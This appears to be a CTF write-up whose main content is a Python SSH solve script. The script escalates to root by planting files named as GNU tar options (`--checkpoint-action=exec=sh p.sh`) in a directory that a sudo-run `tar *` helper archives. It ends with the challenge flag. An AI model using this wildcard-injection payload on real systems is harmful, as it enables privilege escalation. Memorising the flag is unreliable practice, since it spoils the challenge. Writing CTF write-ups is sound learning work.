---
title: "Afterparty Crew"
ctf: "Safaricom CTF"
date: 2026-10-04
category: misc
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "nomadspecter <the.nomad.specter@gmail.com>"
---

# Afterparty Crew

## Summary

Desk: http://54.72.82.22:8550/ — SSH `player@54.72.82.22:8710` pw `matinee-visitor`.

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""Afterparty Crew (misc / linux-tar).

SSH as player, then abuse the NOPASSWD `pack-stage` helper:

    /usr/local/bin/pack-stage  ->  cd /home/player/sets; tar -cf /tmp/night.tar *

`sets/` is player-writable and the glob is expanded by root's shell, so files
named like tar options are parsed as options by root's GNU tar. We plant
`--checkpoint=1` + `--checkpoint-action=exec=sh p.sh`, where p.sh (referenced
relatively, since a filename may not contain '/') copies /root/receipt out.

Run with the paramiko venv:
  /home/nomad/safaricom_ctf/.venv/bin/python solve.py
"""
import re
import sys

import paramiko

HOST, PORT = "54.72.82.22", 8710
USER, PW = "player", "matinee-visitor"

PLANT = r"""
import os, glob, shutil
d = '/home/player/sets'
for f in glob.glob(d + '/*'):
    shutil.rmtree(f) if os.path.isdir(f) else os.remove(f)
open(d + '/keep.txt', 'w').write('keep\n')
open(d + '/--checkpoint=1', 'w').close()
open(d + '/--checkpoint-action=exec=sh p.sh', 'w').close()
open(d + '/p.sh', 'w').write('cp /root/receipt /tmp/r.txt; chmod 644 /tmp/r.txt\n')
"""


def run(cli, cmd, stdin=None):
    _, out, err = cli.exec_command(cmd, timeout=60)
    if stdin is not None:
        stdin.write(stdin)
        stdin.channel.shutdown_write()
    return out.read().decode(errors="replace") + err.read().decode(errors="replace")


def main():
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, port=PORT, username=USER, password=PW, timeout=20)

    print("[*] planting tar option-files in ~/sets")
    i, _, _ = c.exec_command("python3 -", timeout=60)
    i.write(PLANT)
    i.channel.shutdown_write()
    i.channel.recv_exit_status()

    print("[*] running: sudo -n /usr/local/bin/pack-stage")
    print(run(c, "sudo -n /usr/local/bin/pack-stage"))

    out = run(c, "cat /tmp/r.txt")
    print(out)
    m = re.search(r"safctf\{[0-9a-f]{32}\}", out)
    if not m:
        print("[-] flag not found")
        return 1
    print("FLAG:", m.group(0))
    c.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())

```

## Flag

```
safctf{66bda7b8ede495eb131f6bf5bbb9d889}
```
